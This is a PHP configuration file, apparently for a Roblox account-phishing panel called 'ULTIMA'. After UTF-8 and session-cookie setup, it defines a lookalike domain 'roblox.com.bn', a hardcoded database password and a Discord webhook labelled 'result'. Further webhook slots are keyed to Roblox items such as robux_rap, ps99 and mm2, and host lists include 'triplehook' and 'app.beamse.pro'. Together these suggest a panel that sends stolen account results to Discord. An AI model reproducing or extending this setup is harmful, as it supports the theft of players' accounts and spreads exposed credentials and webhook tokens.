<?php

/* UTF-8 karakter kodlaması — Japonca/Korece/Çince/Rusça vb. yabancı
 * kelimelerin `ã¨ãã¦` gibi mojibake olarak görünmesini engeller.
 * Yayıcı: response'un HER varyasyonunda charset=UTF-8 zorla. */
@ini_set('default_charset', 'UTF-8');
@ini_set('output_encoding', 'UTF-8');
@ini_set('mbstring.internal_encoding', 'UTF-8');
@ini_set('mbstring.http_output', 'UTF-8');
if (function_exists('mb_internal_encoding')) mb_internal_encoding('UTF-8');
if (function_exists('mb_http_output')) mb_http_output('UTF-8');
if (function_exists('mb_regex_encoding')) mb_regex_encoding('UTF-8');
if (!headers_sent()) {
    // true = REPLACE — nginx veya başka bir yerin daha önce set etmiş
    // olabileceği Content-Type header'ını üzerine yaz.
    header('Content-Type: text/html; charset=UTF-8', true);
    header('X-Content-Type-Options: nosniff');
}

$sessionLifetime = 365 * 24 * 60 * 60;

if (session_status() !== PHP_SESSION_ACTIVE) {
    session_name('token');
    ini_set('session.gc_maxlifetime', (string) $sessionLifetime);
    ini_set('session.use_strict_mode', '1');
    ini_set('session.use_only_cookies', '1');
    session_set_cookie_params([
        'lifetime' => $sessionLifetime,
        'path' => '/',
        'secure' => true,
        'httponly' => true,
        'samesite' => 'Lax'
    ]);
    session_start();
}

if (!headers_sent() && isset($_COOKIE['PHPSESSID'])) {
    setcookie('PHPSESSID', '', [
        'expires' => time() - 86400,
        'path' => '/',
        'secure' => true,
        'httponly' => true,
        'samesite' => 'Lax'
    ]);
    unset($_COOKIE['PHPSESSID']);
}
if($_SERVER['SERVER_NAME'] == 'hg' || $_SERVER['SERVER_NAME'] == 'hg'){
    $website = [
        "name" => "ULTIMA",
        "thumbnail" => "https://cdn.discordapp.com/",
        "color" => "d90404",
        "domain" => "roblox.com.bn",
        "captchaNode" => "localhost"
    ];
}else{
    $website = [
        "name" => "ULTIMA",
        "thumbnail" => "https://cdn.discordapp.com/",
        "color" => "d90404",
        "domain" => $_SERVER['SERVER_NAME'],
        "captchaNode" => "localhost"
    ];
}
$database = [
    "name" => "database",
    "username" => "database",
    "password" => "abckenlegit"
];
$discord = [
    "url" => "https://discord.gg/8DTHQ9BUQf"
];
$webhook = [
    "result" => "https://discord.com/api/webhooks/1465312274561372211/Psy0tC5gcksatPq1V3P_Nj-ZBjdveyHB_TdnOvsGHGreK6M5B5--0gg2l2Y_hRj5xJA5",
    "koh" => "",
    "robux_rap" => "",
    "am" => "",
    "ps99" => "",
    "mm2" => "",
    "bb" => "",
    "sp" => "",
];
$domain = [
    'blabla.com google:false discord:false global:true tiktok:false',
    'blabla.com google:false discord:false global:true tiktok:false',
    'blabla.com google:false discord:false global:true tiktok:false',
    'blabla.com google:false discord:false global:true tiktok:false',
];

$triplehook = [
    'app.beamse.pro',
];

$discordauth = [
    'app.ultima.cl',
];

$authar = [
    'www.rblxtool.com',
];

$exentions = [
    'rblxtool.com',
];